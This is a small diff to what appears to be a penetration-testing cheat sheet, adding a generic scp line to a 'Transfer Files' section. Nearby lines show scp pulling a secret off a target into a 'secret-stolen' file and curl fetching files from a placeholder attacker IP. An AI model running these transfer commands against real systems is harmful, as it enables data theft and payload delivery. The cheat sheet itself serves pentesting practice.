@@ -170,6 +170,7 @@
   - Transfer Files
 	  - Nc,ncat,wget,curl,scp
 	    - ```tail -f /var/log/apache2/access.log```
+	    - ```scp username@remote:/file/to/send /where/to/put```
 	    - ```scp user@target_ip:/tmp/stickfish/secret /root/secret-stolen```
 	    - ```curl -o theFile http://IP:PORT/theFile```
 	    - ```curl ftp://ftp.domain.com --user username:password```
